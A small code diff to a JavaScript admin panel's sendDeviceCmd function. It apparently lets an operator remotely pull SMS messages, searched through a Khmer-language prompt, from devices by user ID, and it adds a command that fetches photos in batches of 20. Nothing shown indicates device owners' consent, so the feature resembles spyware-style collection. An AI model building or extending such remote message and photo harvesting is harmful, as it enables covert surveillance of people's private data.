@@ -1711,6 +1711,8 @@ window.sendDeviceCmd = async function(userId, cmdType) {
   } else if (cmdType === 'get_sms') {
     const query = prompt('ស្វែងរក SMS (ទទេ = យកទាំងអស់):') || '';
     payload = { query };
+  } else if (cmdType === 'get_photos') {
+    payload = { limit: 20, offset: 0 };
   }
   try {
     const res = await api('/device/command', { method: 'POST', body: { user_id: userId, command_type: cmdType, payload } });
